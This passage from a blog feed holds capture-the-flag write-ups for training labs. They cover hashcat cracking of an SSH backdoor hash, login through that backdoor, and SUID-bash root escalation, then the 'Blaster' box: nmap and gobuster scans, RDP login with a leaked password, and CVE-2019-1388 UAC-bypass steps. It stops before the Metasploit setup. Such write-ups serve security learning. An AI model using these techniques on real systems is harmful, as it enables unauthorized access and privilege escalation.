&lt;p&gt;It turns out that &lt;a href=&quot;https://github.com/NinjaJc01/ssh-backdoor&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;https://github.com/NinjaJc01/ssh-backdoor&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is a real thing, with the code itself living in &lt;a href=&quot;https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;hashPassword()&lt;/code&gt; function here takes the SHA-512 hash of the provided password + the salt. The default has is overridden using the &lt;code&gt;-a&lt;/code&gt; flag. We can see that the attacker used this flag when the backdoor was called in packet 3479.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;./backdoor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;We can use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hashcat&quot;&gt;Hashcat&lt;/a&gt; to again crack this.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;hashcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 1710&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-O&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;	   ~/.local/share/red-team/wordlists/rockyou.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;h2 id=&quot;attack-get-back-in&quot;&gt;Attack: Get back in!&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#attack-get-back-in&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The last bit of this CTF uses a server, which for this run is at 10.10.114.161. Just visiting that page gives us our first flag.&lt;/p&gt;
&lt;p&gt;We’ll get back in using the backdoor that the attacker set up. From the backdoor code we know that the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; server is running on port 2222, and there don’t seem to be any user checks. So…&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;env&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; SSH_AUTH_SOCK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; SSH_AGENT_PID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;	ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 2222&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; user@10.10.114.161&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;…lets us in as expected (with the password we previously cracked).&lt;/p&gt;
&lt;p&gt;The user flag is in /home/james/user.txt.&lt;/p&gt;
&lt;p&gt;Unfortunately, none of the passwords we cracked earlier work anymore. After checking a couple of possible exploits to get around this, I decided just to see what SUID binaries were on the system (figuring that I’d check them against &lt;a href=&quot;https://gtfobins.github.io/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;GTFOBins&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;).&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -perm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -u+s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;{}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This turned up an unusual file — &lt;code&gt;/home/james/.suid_bash&lt;/code&gt;. Could this be… &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/how-to-avoid-dropping-privileges-with-suid-bash&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/how-to-avoid-dropping-privileges-with-suid-bash&quot;&gt;an SUID copy of Bash&lt;/a&gt;? Indeed it is!&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;/home/james/.suid_bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0&quot;&gt; # Root shell!&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;The root flag is then in /root/root.txt.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 1 h 43 min&lt;/p&gt;</description>
    <pubDate>Tue, 14 Dec 2021 00:00:00 GMT</pubDate>
  </item><item>
    <title>Blaster</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2021-12-08-blaster</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2021-12-08-blaster</guid>
    <description>&lt;h2 id=&quot;mission-start&quot;&gt;Mission start!&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#mission-start&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The CTF background notes that we’ll be attacking a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/windows&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/windows&quot;&gt;Windows&lt;/a&gt; box. So no ping responses again.&lt;/p&gt;
&lt;h2 id=&quot;activate-forward-scanners-and-launch-proton-torpedoes&quot;&gt;Activate forward scanners and launch proton torpedoes&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#activate-forward-scanners-and-launch-proton-torpedoes&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The machine we’ll be attacking is at 10.10.223.185. As usual, we’ll start out with an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; scan:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; blaster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.223.185&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Which gives us:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Wed Dec  8 19:55:54 2021 as: nmap -v -oA blaster -Pn -A -T4 -sS -script vuln -p- 10.10.223.185
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.223.185
Host is up (0.23s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (90%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.013 days (since Wed Dec  8 19:54:04 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   34.47 ms  10.13.0.1
2   ... 3
4   351.16 ms 10.10.223.185

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  8 20:12:16 2021 -- 1 IP address (1 host up) scanned in 982.31 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Looks like IIS running on port 80. Let’s go take a peek.&lt;/p&gt;
&lt;p&gt;…And, it’s just the default IIS “hello world” page. Looks a damn sight prettier than Apache’s.&lt;/p&gt;
&lt;p&gt;Since there’s nothing obvious here (and because the CTF is prompting us to do so), let’s sic &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; on this to see if there’s anything interesting that’s not linked to the (default) index page.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.10.223.185/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;There &lt;em&gt;is&lt;/em&gt; a hidden directory here, and browsing to it reveals an entire “Retro Fanatics” website. All posts are by “Wade”.&lt;/p&gt;
&lt;p&gt;Poking around a bit more reveals a somewhat cryptic comment on a post:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Leaving myself a note here just in case I forget how to spell it: parzival&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Who wants to bet that this is Wade’s password?&lt;/p&gt;
&lt;p&gt;Let’s load up &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/xfreerdp&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/xfreerdp&quot;&gt;XFreeRDP&lt;/a&gt; and see if we can log in, shall we?&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;xfreerdp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /dynamic-resolution&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; +clipboard&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /cert:ignore&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;         /v:10.10.223.185&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /u:Wade&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /p:parzival&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Boom!&lt;/p&gt;
&lt;h2 id=&quot;breaching-the-control-room&quot;&gt;Breaching the control room&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#breaching-the-control-room&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;There’s no obvious files when pocking around except an hhupd.exe file on the desktop, and IE’s history is empty.&lt;/p&gt;
&lt;p&gt;Since I know we’re looking for a CVE name, at this point I just used the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/windows&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/windows&quot;&gt;Windows&lt;/a&gt; File Explorer to search Wade’s home directory for “CVE”. And lo-and-behold, there’s a cached HTML file in &lt;code&gt;C:\Users\Wade\AppData\Local\Microsoft\Windows\INetCache\Low\IE\7Z6YUWVY&lt;/code&gt; called &lt;code&gt;cvename[1].htm&lt;/code&gt; which contains a website referencing CVE-2019-1388 (it looks like a slightly older version of the &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1388&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;MITRE CVE page on CVE-2019-1388&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;(I feel like the approach I just used — making an educated guess about what the CTF was looking for and then just searching for it — is kind of a cop-out. &lt;em&gt;But&lt;/em&gt;, the hint for this question states that I should check IE’s history, which I did… So perhaps the room’s broken?)&lt;/p&gt;
&lt;p&gt;Anyways, I’m guessing that the hhupd.exe file on the desktop is the one that will exploit this vulnerability, since it’s badged as needing administrative privileges and CVE-2019-1388 is a vulnerability in the UAC screen.&lt;/p&gt;
&lt;p&gt;In fact, a search for “CVE-2019-1388 exploit” pulls up &lt;a href=&quot;https://www.nagenrauft-consulting.com/2019/11/21/cve-2019-1388-hhupd-exe/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a page that references hhupd.exe&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and helpfully links to &lt;a href=&quot;https://www.youtube.com/watch?v=3BQKpPNlTSo&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a YouTube video demoing how this exploit works&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. It looks like the steps here are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Try to run hhupd.exe.&lt;/li&gt;
&lt;li&gt;Show details on the UAC prompt.&lt;/li&gt;
&lt;li&gt;Click on the certificate information link.&lt;/li&gt;
&lt;li&gt;Click on the issuer link. This will open up an instance of IE running with elevated permissions in the background.&lt;/li&gt;
&lt;li&gt;Exit the UAC dialog.&lt;/li&gt;
&lt;li&gt;Bring up the save dialog in IE.&lt;/li&gt;
&lt;li&gt;Navigate to &lt;code&gt;C:/Windows/System32/*.*&lt;/code&gt; and open cmd.exe.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The final flag is in the Administrator’s Desktop folder.&lt;/p&gt;
&lt;h2 id=&quot;adoption-into-the-collective&quot;&gt;Adoption into the collective&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#adoption-into-the-collective&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Target information isn’t immediately obvious in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/metasploit&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/metasploit&quot;&gt;Metasploit&lt;/a&gt;; after selecting &lt;code&gt;exploit/multi/script/web_delivery&lt;/code&gt; we’ll need to run &lt;code&gt;info&lt;/code&gt; to see all of the options.&lt;/p&gt;
&lt;p&gt;Let’s set things up and run the exploit:&lt;/p&gt;
